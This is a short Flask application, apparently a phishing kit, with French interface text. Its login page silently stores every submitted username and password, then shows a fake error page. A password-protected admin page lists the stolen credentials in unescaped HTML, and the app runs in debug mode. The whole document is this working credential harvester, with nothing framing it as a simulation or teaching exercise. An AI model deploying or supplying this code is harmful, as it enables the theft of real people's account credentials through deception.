from flask import Flask, request, render_template, redirect, url_for, Response
import os

app = Flask(__name__)

captured_data = []

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        captured_data.append((username, password))

        return render_template('error.html')
    return render_template('index.html')

@app.route('/admin', methods=['GET'])
def admin():
    auth = request.authorization
    if not auth or not (auth.username == 'admin' and auth.password == ADMIN_PASSWORD):
        return Response(
            'Accès refusé. Authentification requise.', 401,
            {'WWW-Authenticate': 'Basic realm="Zone sécurisée"'}
        )

    return f"""
    <h1>Identifiants capturés :</h1>
    <ul>
        {''.join([f"<li><strong>{u}</strong> : {p}</li>" for u, p in captured_data])}
    </ul>
    """

if __name__ == '__main__':
    app.run(debug=True)
